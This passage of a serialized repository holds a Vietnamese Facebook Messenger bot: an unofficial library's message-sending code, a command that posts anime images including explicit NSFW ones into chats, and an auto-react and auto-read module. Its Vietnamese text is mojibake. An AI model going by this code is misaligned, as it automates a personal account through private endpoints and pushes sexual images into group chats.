Database(true).set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));\n            Database(true).set('UserName', userName);\n            process.env.HalzionVersion = 1973\n            Text = \"B·∫°n ƒêang S√†i Phi√™n B·∫£n: Premium Access\";\n        }\n        catch (error) {\n            Text = \"L·ªói K·∫øt N·ªëi\";\n        }\n    }\n    if (process.env.HalzionVersion == 1973) {\n        try {\n            let data = [];\n            var getAll = await getAll();\n            if (getAll.length > 1) {\n                getAll.forEach((i) => {\n                    if (i.data.messageCount !== undefined) {\n                        data.push(i.data.threadID);\n                    }\n                });\n                deleteAll(data);\n            }\n        } catch (e) {\n            console.log(e);\n        }\n    }\nreturn Text;\n}","path":null,"size_bytes":3324,"size_tokens":null},"lib/fca-auto/src/sendMessage.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\nvar bluebird = require(\"bluebird\");\n\nvar allowedProperties = {\n\tattachment: true,\n\turl: true,\n\tsticker: true,\n\temoji: true,\n\temojiSize: true,\n\tbody: true,\n\tmentions: true,\n\tlocation: true,\n};\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\tfunction uploadAttachment(attachments, callback) {\n\t\tvar uploads = [];\n\n\t\t// create an array of promises\n\t\tfor (var i = 0; i < attachments.length; i++) {\n\t\t\tif (!utils.isReadableStream(attachments[i])) throw { error: \"Attachment should be a readable stream and not \" + utils.getType(attachments[i]) + \".\" };\n\t\t\tvar form = {\n\t\t\t\tupload_1024: attachments[i],\n\t\t\t\tvoice_clip: \"true\"\n\t\t\t};\n\n\t\t\tuploads.push(\n\t\t\t\tdefaultFuncs\n\t\t\t\t\t.postFormData(\"https://upload.facebook.com/ajax/mercury/upload.php\", ctx.jar, form, {}, {})\n\t\t\t\t\t.then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n\t\t\t\t\t.then(function (resData) {\n\t\t\t\t\t\tif (resData.error) throw resData;\n\t\t\t\t\t\t// We have to return the data unformatted unless we want to change it\n\t\t\t\t\t\t// back in sendMessage.\n\t\t\t\t\t\treturn resData.payload.metadata[0];\n\t\t\t\t\t})\n\t\t\t);\n\t\t}\n\n\t\t// resolve all promises\n\t\tbluebird\n\t\t\t.all(uploads)\n\t\t\t.then(resData => callback(null, resData))\n\t\t\t.catch(function (err) {\n\t\t\t\tlog.error(\"uploadAttachment\", err);\n\t\t\t\treturn callback(err);\n\t\t\t});\n\t}\n\n\tfunction getUrl(url, callback) {\n\t\tvar form = {\n\t\t\timage_height: 960,\n\t\t\timage_width: 960,\n\t\t\turi: url\n\t\t};\n\n\t\tdefaultFuncs\n\t\t\t.post(\"https://www.facebook.com/message_share_attachment/fromURI/\", ctx.jar, form)\n\t\t\t.then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n\t\t\t.then(function (resData) {\n\t\t\t\tif (resData.error) return callback(resData);\n\t\t\t\tif (!resData.payload) return callback({ error: \"Invalid url\" });\n\t\t\t\tcallback(null, resData.payload.share_data.share_params);\n\t\t\t})\n\t\t\t.catch(function (err) {\n\t\t\t\tlog.error(\"getUrl\", err);\n\t\t\t\treturn callback(err);\n\t\t\t});\n\t}\n\n\tfunction sendContent(form, threadID, isSingleUser, messageAndOTID, callback) {\n\t// √©p t·∫•t c·∫£ threadID v·ªÅ string\n\tif (utils.getType(threadID) === \"Array\") {\n\t\tthreadID = threadID.map(id => id.toString());\n\t\tfor (var i = 0; i < threadID.length; i++) \n\t\t\tform[\"specific_to_list[\" + i + \"]\"] = \"fbid:\" + threadID[i];\n\t\tform[\"specific_to_list[\" + threadID.length + \"]\"] = \"fbid:\" + ctx.userID;\n\t\tform[\"client_thread_id\"] = \"root:\" + messageAndOTID;\n\t\tlog.info(\"sendMessage\", \"Sending message to multiple users: \" + threadID);\n\t}\n\telse {\n\t\tthreadID = threadID.toString();\n\t\tif (isSingleUser) {\n\t\t\tform[\"specific_to_list[0]\"] = \"fbid:\" + threadID;\n\t\t\tform[\"specific_to_list[1]\"] = \"fbid:\" + ctx.userID;\n\t\t\tform[\"other_user_fbid\"] = threadID;\n\t\t}\n\t\telse {\n\t\t\tform[\"thread_fbid\"] = threadID;\n\t\t}\n\t}\n\n\tif (ctx.globalOptions.pageID) {\n\t\tform[\"author\"] = \"fbid:\" + ctx.globalOptions.pageID;\n\t\tform[\"specific_to_list[1]\"] = \"fbid:\" + ctx.globalOptions.pageID;\n\t\tform[\"creator_info[creatorID]\"] = ctx.userID;\n\t\tform[\"creator_info[creatorType]\"] = \"direct_admin\";\n\t\tform[\"creator_info[labelType]\"] = \"sent_message\";\n\t\tform[\"creator_info[pageID]\"] = ctx.globalOptions.pageID;\n\t\tform[\"request_user_id\"] = ctx.globalOptions.pageID;\n\t\tform[\"creator_info[profileURI]\"] = \"https://www.facebook.com/profile.php?id=\" + ctx.userID;\n\t}\n\n\tdefaultFuncs\n\t\t.post(\"https://www.facebook.com/messaging/send/\", ctx.jar, form)\n\t\t.then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n\t\t.then(function (resData) {\n\t\t\tif (!resData) return callback({ error: \"Send message failed.\" });\n\t\t\tif (resData.error) {\n\t\t\t\tif (resData.error === 1545012) {\n\t\t\t\t\tlog.warn(\"sendMessage\", \"Got error 1545012. This might mean that you're not part of the conversation \" + threadID);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tlog.error(\"sendMessage\", resData);\n\t\t\t\t}\n\t\t\t\treturn callback(resData);\n\t\t\t}\n\n\t\t\tvar messageInfo = resData.payload.actions.reduce(function (p, v) {\n\t\t\t\treturn (\n\t\t\t\t\t{\n\t\t\t\t\t\tthreadID: v.thread_fbid,\n\t\t\t\t\t\tmessageID: v.message_id,\n\t\t\t\t\t\ttimestamp: v.timestamp\n\t\t\t\t\t} || p\n\t\t\t\t);\n\t\t\t}, null);\n\n\t\t\treturn callback(null, messageInfo);\n\t\t})\n\t\t.catch(function (err) {\n\t\t\tlog.error(\"sendMessage\", err);\n\t\t\tif (utils.getType(err) == \"Object\" && err.error === \"Not logged in.\") ctx.loggedIn = false;\n\t\t\treturn callback(err);\n\t\t});\n\t    \n\t}\n\n\n\t// T·ªëi ∆∞u h√≥a: Th√™m c√°c h√†m c·∫ßn thi·∫øt t·ª´ cache/database\nconst { hasData, createData, getData } = require('../Extra/ExtraGetThread');\n\nfunction send(form, threadID, messageAndOTID, callback, isGroup) {\n    if (utils.getType(threadID) === \"Array\") {\n        sendContent(form, threadID, false, messageAndOTID, callback);\n        return;\n    }\n\n    // T·ªëi ∆∞u: Ki·ªÉm tra cache tr∆∞·ªõc ƒë·ªÉ tr√°nh g·ªçi API kh√¥ng c·∫ßn thi·∫øt\n    if (global.Fca.isUser.includes(threadID)) {\n        sendContent(form, threadID, true, messageAndOTID, callback);\n        return;\n    }\n    if (global.Fca.isThread.includes(threadID) || hasData(threadID)) {\n        sendContent(form, threadID, false, messageAndOTID, callback);\n        return;\n    }\n\n    // N·∫øu kh√¥ng c√≥ trong cache, m·ªõi g·ªçi getThreadInfo ƒë·ªÉ x√°c ƒë·ªãnh l·∫ßn ƒë·∫ßu\n    api.getThreadInfo(threadID, (err, info) => {\n        // Tr∆∞·ªùng h·ª£p l·ªói ho·∫∑c nh√≥m m·ªõi (API kh√¥ng tr·∫£ v·ªÅ info) -> M·∫∑c ƒë·ªãnh l√† nh√≥m\n        if (err || !info) {\n            // L∆∞u l·∫°i ƒë·ªÉ l·∫ßn sau kh√¥ng c·∫ßn check n·ªØa\n            if (!global.Fca.isThread.includes(threadID)) global.Fca.isThread.push(threadID);\n            sendContent(form, threadID, false, messageAndOTID, callback);\n            return;\n        }\n\n        // N·∫øu l√† nh√≥m, l∆∞u l·∫°i v√† g·ª≠i tin\n        if (info.isGroup) {\n            if (!global.Fca.isThread.includes(threadID)) global.Fca.isThread.push(threadID);\n            sendContent(form, threadID, false, messageAndOTID, callback);\n        } \n        // N·∫øu l√† ng∆∞·ªùi d√πng, l∆∞u l·∫°i v√† g·ª≠i tin\n        else {\n            if (!global.Fca.isUser.includes(threadID)) global.Fca.isUser.push(threadID);\n            sendContent(form, threadID, true, messageAndOTID, callback);\n        }\n    });\n}\n\n\n\tfunction handleUrl(msg, form, callback, cb) {\n\t\tif (msg.url) {\n\t\t\tform[\"shareable_attachment[share_type]\"] = \"100\";\n\t\t\tgetUrl(msg.url, function (err, params) {\n\t\t\t\tif (err) return callback(err);\n\t\t\t\tform[\"shareable_attachment[share_params]\"] = params;\n\t\t\t\tcb();\n\t\t\t});\n\t\t}\n\t\telse cb();\n\t}\n\n\tfunction handleLocation(msg, form, callback, cb) {\n\t\tif (msg.location) {\n\t\t\tif (msg.location.latitude == null || msg.location.longitude == null) return callback({ error: \"location property needs both latitude and longitude\" });\n\t\t\tform[\"location_attachment[coordinates][latitude]\"] = msg.location.latitude;\n\t\t\tform[\"location_attachment[coordinates][longitude]\"] = msg.location.longitude;\n\t\t\tform[\"location_attachment[is_current_location]\"] = !!msg.location.current;\n\t\t}\n\t\tcb();\n\t}\n\n\tfunction handleSticker(msg, form, callback, cb) {\n\t\tif (msg.sticker) form[\"sticker_id\"] = msg.sticker;\n\t\tcb();\n\t}\n\n\tfunction handleEmoji(msg, form, callback, cb) {\n\t\tif (msg.emojiSize != null && msg.emoji == null) return callback({ error: \"emoji property is empty\" });\n\t\tif (msg.emoji) {\n\t\t\tif (msg.emojiSize == null) msg.emojiSize = \"medium\";\n\t\t\tif (msg.emojiSize != \"small\" && msg.emojiSize != \"medium\" && msg.emojiSize != \"large\") return callback({ error: \"emojiSize property is invalid\" });\n\t\t\tif (form[\"body\"] != null && form[\"body\"] != \"\") return callback({ error: \"body is not empty\" });\n\t\t\tform[\"body\"] = msg.emoji;\n\t\t\tform[\"tags[0]\"] = \"hot_emoji_size:\" + msg.emojiSize;\n\t\t}\n\t\tcb();\n\t}\n\n\tfunction handleAttachment(msg, form, callback, cb) {\n\t\tif (msg.attachment) {\n\t\t\tform[\"image_ids\"] = [];\n\t\t\tform[\"gif_ids\"] = [];\n\t\t\tform[\"file_ids\"] = [];\n\t\t\tform[\"video_ids\"] = [];\n\t\t\tform[\"audio_ids\"] = [];\n\n\t\t\tif (utils.getType(msg.attachment) !== \"Array\") msg.attachment = [msg.attachment];\n\t\t\tif (msg.attachment.every(e=>/_id$/.test(e[0]))) {\n\t\t\t\t//console.log(msg.attachment)\n\t\t\t\tmsg.attachment.map(e=>form[`${e[0]}s`].push(e[1]));\n\t\t\t\treturn cb();\n\t\t\t  }\n\t\t\tuploadAttachment(msg.attachment, function (err, files) {\n\t\t\t\tif (err) return callback(err);\n\t\t\t\tfiles.forEach(function (file) {\n\t\t\t\t\tvar key = Object.keys(file);\n\t\t\t\t\tvar type = key[0]; // image_id, file_id, etc\n\t\t\t\t\tform[\"\" + type + \"s\"].push(file[type]); // push the id\n\t\t\t\t});\n\t\t\t\tcb();\n\t\t\t});\n\t\t}\n\t\telse cb();\n\t}\n\n\tfunction handleMention(msg, form, callback, cb) {\n\t\tif (msg.mentions) {\n\t\t\tfor (let i = 0; i < msg.mentions.length; i++) {\n\t\t\t\tconst mention = msg.mentions[i];\n\t\t\t\tconst tag = mention.tag;\n\t\t\t\tif (typeof tag !== \"string\") return callback({ error: \"Mention tags must be strings.\" });\n\t\t\t\tconst offset = msg.body.indexOf(tag, mention.fromIndex || 0);\n\t\t\t\tif (offset < 0) log.warn(\"handleMention\", 'Mention for \"' + tag + '\" not found in message string.');\n\t\t\t\tif (mention.id == null) log.warn(\"handleMention\", \"Mention id should be non-null.\");\n\n\t\t\t\tconst id = mention.id || 0;\n\t\t\t\tconst emptyChar = '\\u200E';\n\t\t\t\tform[\"body\"] = emptyChar + msg.body;\n\t\t\t\tform[\"profile_xmd[\" + i + \"][offset]\"] = offset + 1;\n\t\t\t\tform[\"profile_xmd[\" + i + \"][length]\"] = tag.length;\n\t\t\t\tform[\"profile_xmd[\" + i + \"][id]\"] = id;\n\t\t\t\tform[\"profile_xmd[\" + i + \"][type]\"] = \"p\";\n\t\t\t}\n\t\t}\n\t\tcb();\n\t}\n\n\treturn function sendMessage(msg, threadID, callback, replyToMessage, isGroup) {\n\ttypeof isGroup == \"undefined\" ? isGroup = null : \"\";\n\tif (!callback && (utils.getType(threadID) === \"Function\" || utils.getType(threadID) === \"AsyncFunction\")) \n\t\treturn threadID({ error: \"Pass a threadID as a second argument.\" });\n\tif (!replyToMessage && utils.getType(callback) === \"String\") {\n\t\treplyToMessage = callback;\n\t\tcallback = function () { };\n\t}\n\n\tvar resolveFunc = function () { };\n\tvar rejectFunc = function () { };\n\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\tresolveFunc = resolve;\n\t\trejectFunc = reject;\n\t});\n\n\tif (!callback) {\n\t\tcallback = function (err, data) {\n\t\t\tif (err) return rejectFunc(err);\n\t\t\tresolveFunc(data);\n\t\t};\n\t}\n\n\tvar msgType = utils.getType(msg);\n\tvar threadIDType = utils.getType(threadID);\n\tvar messageIDType = utils.getType(replyToMessage);\n\n\tif (msgType !== \"String\" && msgType !== \"Object\") \n\t\treturn callback({ error: \"Message should be of type string or object and not \" + msgType + \".\" });\n\n\t// √©p threadID v·ªÅ string n·∫øu l√† number\n\tif (threadIDType === \"Number\") threadID = threadID.toString();\n\n\t// Changing this to accomodate an array of users\n\tif (threadIDType !== \"Array\" && threadIDType !== \"Number\" && threadIDType !== \"String\") \n\t\treturn callback({ error: \"ThreadID should be of type number, string, or array and not \" + threadIDType + \".\" });\n\n\tif (replyToMessage && messageIDType !== 'String') \n\t\treturn callback({ error: \"MessageID should be of type string and not \" + threadIDType + \".\" });\n\n\tif (msgType === \"String\") msg = { body: msg };\n\tvar disallowedProperties = Object.keys(msg).filter(prop => !allowedProperties[prop]);\n\tif (disallowedProperties.length > 0) \n\t\treturn callback({ error: \"Dissallowed props: `\" + disallowedProperties.join(\", \") + \"`\" });\n\n\tvar messageAndOTID = utils.generateOfflineThreadingID();\n\n\tvar form = {\n\t\tclient: \"mercury\",\n\t\taction_type: \"ma-type:user-generated-message\",\n\t\tauthor: \"fbid:\" + ctx.userID,\n\t\ttimestamp: Date.now(),\n\t\ttimestamp_absolute: \"Today\",\n\t\ttimestamp_relative: utils.generateTimestampRelative(),\n\t\ttimestamp_time_passed: \"0\",\n\t\tis_unread: false,\n\t\tis_cleared: false,\n\t\tis_forward: false,\n\t\tis_filtered_content: false,\n\t\tis_filtered_content_bh: false,\n\t\tis_filtered_content_account: false,\n\t\tis_filtered_content_quasar: false,\n\t\tis_filtered_content_invalid_app: false,\n\t\tis_spoof_warning: false,\n\t\tsource: \"source:chat:web\",\n\t\t\"source_tags[0]\": \"source:chat\",\n\t\tbody: msg.body ? msg.body.toString() : \"\",\n\t\thtml_body: false,\n\t\tui_push_phase: \"V3\",\n\t\tstatus: \"0\",\n\t\toffline_threading_id: messageAndOTID,\n\t\tmessage_id: messageAndOTID,\n\t\tthreading_id: utils.generateThreadingID(ctx.clientID),\n\t\t\"ephemeral_ttl_mode:\": \"0\",\n\t\tmanual_retry_cnt: \"0\",\n\t\thas_attachment: !!(msg.attachment || msg.url || msg.sticker),\n\t\tsignatureID: utils.getSignatureID(),\n\t\treplied_to_message_id: replyToMessage\n\t};\n\n\thandleLocation(msg, form, callback, () =>\n\t\thandleSticker(msg, form, callback, () =>\n\t\t\thandleAttachment(msg, form, callback, () =>\n\t\t\t\thandleUrl(msg, form, callback, () =>\n\t\t\t\t\thandleEmoji(msg, form, callback, () =>\n\t\t\t\t\t\thandleMention(msg, form, callback, () =>\n\t\t\t\t\t\t\tsend(form, threadID, messageAndOTID, callback, isGroup)\n\t\t\t\t\t\t)\n\t\t\t\t\t)\n\t\t\t\t)\n\t\t\t)\n\t\t)\n\t);\n\treturn returnPromise;\n  };\n};","path":null,"size_bytes":12445,"size_tokens":null},"modules/commands/animev1.js":{"content":"module.exports.config = {\n    name: \"animev1\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"tdunguwu\",\n    description: \"\",\n    commandCategory: \"Random-img\",\n    usages: \"\",\n    cooldowns: 30,\n   \n  };\n  module.exports.run = async({api, event, args}) => {\n  \n       const axios = require('axios');\n    const request = require('request');\n    const fs = require(\"fs\");\n      if (args[0] == \"waifu\") {\n          axios.get('https://api.waifu.pics/sfw/waifu').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/waifu.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/waifu.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/waifu.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"neko\") {\n          axios.get('https://api.waifu.pics/sfw/neko').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/waifu.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/waifu.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/waifu.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"shinobu\") {\n          axios.get('https://api.waifu.pics/sfw/shinobu').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/shinobu.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/shinobu.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/shinobu.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"megumin\") {\n          axios.get('https://api.waifu.pics/sfw/megumin').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/megumin.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/megumin.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/megumin.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"bully\") {\n          axios.get('https://api.waifu.pics/sfw/bully').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/bully.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/bully.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/bully.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"cuddle\") {\n          axios.get('https://api.waifu.pics/sfw/cuddle').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/cuddle.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/cuddle.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/cuddle.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"cry\") {\n          axios.get('https://api.waifu.pics/sfw/cry').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/cry.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/cry.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/cry.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"hug\") {\n          axios.get('https://api.waifu.pics/sfw/hug').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/hug.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/hug.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/hug.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"awoo\") {\n          axios.get('https://api.waifu.pics/sfw/awoo').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/awoo.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/awoo.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/awoo.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"smile\") {\n          axios.get('https://api.waifu.pics/sfw/smile').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/smile.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/smile.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/smile.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"wfnsfw\") {\n          axios.get('https://api.waifu.pics/nsfw/waifu').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/waifu.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/waifu.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/waifu.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"nekonsfw\") {\n          axios.get('https://api.waifu.pics/nsfw/neko').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/nsfw.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/nsfw.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/nsfw.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"trapnsfw\") {\n          axios.get('https://api.waifu.pics/nsfw/trap').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/nsfw.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/nsfw.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/nsfw.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args[0] == \"blowjobnsfw\") {\n          axios.get('https://api.waifu.pics/nsfw/blowjob').then(res => {\n    let ext = res.data.url.substring(res.data.url.lastIndexOf(\".\") + 1);\n  \n    let callback = function () {\n            api.sendMessage({\n              body: ``,\n              attachment: fs.createReadStream(__dirname + `/cache/nsfw.${ext}`)\n            }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/nsfw.${ext}`), event.messageID);\n          };\n          request(res.data.url).pipe(fs.createWriteStream(__dirname + `/cache/nsfw.${ext}`)).on(\"close\", callback);\n        })\n  }\n  else if (args.join() == \"\") { return api.sendMessage(`ùòΩùôñÃ£ùô£ ùôòùô§ÃÅ ùô©ùôùùôöÃÇÃâ ùôôùô™ÃÄùô£ùôú:\\n${global.config.PREFIX}animev1 waifu\\n${global.config.PREFIX}animev1 neko\\n${global.config.PREFIX}animev1 shinobu\\n${global.config.PREFIX}animev1 megumin\\n${global.config.PREFIX}animev1 bully\\n${global.config.PREFIX}animev1 cuddle\\n${global.config.PREFIX}animev1 cry\\n${global.config.PREFIX}animev1 hug\\n${global.config.PREFIX}animev1 awoo\\n${global.config.PREFIX}animev1 smile\\n${global.config.PREFIX}animev1 wfnsfw\\n${global.config.PREFIX}animev1 nekonsfw\\n${global.config.PREFIX}animev1 trapnsfw\\n${global.config.PREFIX}animev1 blowjobnsfw`, event.threadID, event.messageID);\n    }\n  }","path":null,"size_bytes":9452,"size_tokens":null},"modules/commands/auto.js":{"content":"const fs = require('fs-extra');\nconst pathReaction = __dirname + '/cache/data/autoreaction.txt';\nconst pathSeen = __dirname + '/cache/data/autoseen.txt';\n\n// T·∫°o file m·∫∑c ƒë·ªãnh n·∫øu ch∆∞a t·ªìn t·∫°i\nif (!fs.existsSync(pathReaction)) {\n  fs.writeFileSync(pathReaction, 'true');\n}\nif (!fs.existsSync(pathSeen)) {\n  fs.writeFileSync(pathSeen, 'true');\n}\n\nmodule.exports.config = {\n  name: \"auto\",\n  version: \"1.2.0\",\n  hasPermssion: 3,\n  credits: \"Assistant\",\n  description: \"T·ª± ƒë·ªông seen v√†/ho·∫∑c th·∫£ c·∫£m x√∫c ng·∫´u nhi√™n\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"reaction on/off | seen on/off\",\n  cooldowns: 5,\n};\n\nconst messageStats = {};\nconst lastSeenTime = {};\n\nmodule.exports.handleEvent = async ({ api, event }) => {\n  try {\n    const isReactionEnabled = fs.readFileSync(pathReaction, 'utf-8').trim() === 'true';\n    const isSeenEnabled = fs.readFileSync(pathSeen, 'utf-8').trim() === 'true';\n\n    const { threadID, messageID, senderID } = event;\n    const currentUserID = await api.getCurrentUserID();\n\n    if (senderID === currentUserID) return; // B·ªè qua tin nh·∫Øn c·ªßa bot\n\n    // T·ª± ƒë·ªông th·∫£ c·∫£m x√∫c\n    if (isReactionEnabled) {\n      if (!messageStats[threadID]) {\n        messageStats[threadID] = {\n          count: 0,\n          threshold: Math.floor(Math.random() * 16) + 15,\n        };\n      }\n\n      messageStats[threadID].count++;\n\n      if (messageStats[threadID].count >= messageStats[threadID].threshold) {\n        const reactions = ['üòπ', 'üòª', 'üòº', 'üòΩ', 'üôÄ', 'üòø', 'üòæ'];\n        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];\n\n        messageStats[threadID] = {\n          count: 0,\n          threshold: Math.floor(Math.random() * 16) + 15,\n        };\n\n        try {\n          await new Promise((resolve, reject) => {\n            api.setMessageReaction(randomReaction, messageID, true, (err) => {\n              if (err) return reject(err);\n              resolve();\n            });\n          });\n        } catch (err) {\n          console.error(`[ERROR] Kh√¥ng th·ªÉ th·∫£ c·∫£m x√∫c ·ªü threadID: ${threadID}`, err);\n        }\n      }\n    }\n\n    // T·ª± ƒë·ªông seen tin nh·∫Øn\n    // T·ª± ƒë·ªông seen tin nh·∫Øn v·ªõi delay\nif (isSeenEnabled) {\n  const currentTime = Date.now();\n  const delayTime = 120000;\n\n  if (!lastSeenTime[threadID] || currentTime - lastSeenTime[threadID] >= delayTime) {\n    try {\n      await api.markAsReadAll(threadID);\n      lastSeenTime[threadID] = currentTime;\n    } catch (err) {\n    }\n  } else {\n  }\n}\n  } catch (e) {\n    console.error(`[ERROR] X·ª≠ l√Ω s·ª± ki·ªán th·∫•t b·∫°i`, e);\n  }\n};\n\nmodule.exports.run = async ({ api, event, args }) => {\n  const { threadID, messageID } = event;\n  try {\n    if (args[0] === 'reaction') {\n      if (args[1] === 'on') {\n        fs.writeFileSync(pathReaction, 'true');\n        api.sendMessage('‚úÖ ƒê√£ b·∫≠t t·ª± ƒë·ªông th·∫£ c·∫£m x√∫c.', threadID, messageID);\n      } else if (args[1] === 'off') {\n        fs.writeFileSync(pathReaction, 'false');\n        api.sendMessage('üõë ƒê√£ t·∫Øt t·ª± ƒë·ªông th·∫£ c·∫£m x√∫c.', threadID, messageID);\n      } else {\n        api.sendMessage('‚ö†Ô∏è Sai c√∫ ph√°p. Vui l√≤ng s·ª≠ d·ª•ng:\\n-reaction on: B·∫≠t t·ª± ƒë·ªông th·∫£ c·∫£m x√∫c\\n-reaction off: T·∫Øt t·ª± ƒë·ªông th·∫£ c·∫£m x√∫c.', threadID, messageID);\n      }\n    } else if (args[0] === 'seen') {\n      if (args[1] === 'on') {\n        fs.writeFileSync(pathSeen, 'true');\n        api.sendMessage('‚úÖ ƒê√£ b·∫≠t t·ª± ƒë·ªông seen tin nh·∫Øn.', threadID, messageID);\n      } else if (args[1] === 'off') {\n        fs.writeFileSync(pathSeen, 'false');\n        api.sendMessage('üõë ƒê√£ t·∫Øt t·ª± ƒë·ªông seen tin nh·∫Øn.', threadID, messageID);\n      } else {\n        api.sendMessage('‚ö†Ô∏è Sai c√∫ ph√°p. Vui l√≤ng s·ª≠ d·ª•ng:\\n-seen on: B·∫≠t t·ª± ƒë·ªông seen tin nh·∫Øn\\n-seen off: T·∫Øt t·ª± ƒë·ªông seen tin nh·∫Øn.', threadID, messageID);\n      }\n    } else {\n      api.sendMessage(\n        '‚ö†Ô∏è Sai c√∫ ph√°p. Vui l√≤ng s·ª≠ d·ª•ng:\\n-reaction on/off: B·∫≠t/t·∫Øt t·ª± ƒë·ªông th·∫£ c·∫£m x√∫c\\n-seen on/off: B·∫≠t/t·∫Øt t·ª± ƒë·ªông seen tin nh·∫Øn.',\n        threadID,\n        messageID\n      );\n    }\n  } catch (e) {\n    api.sendMessage(\"‚ö†Ô∏è 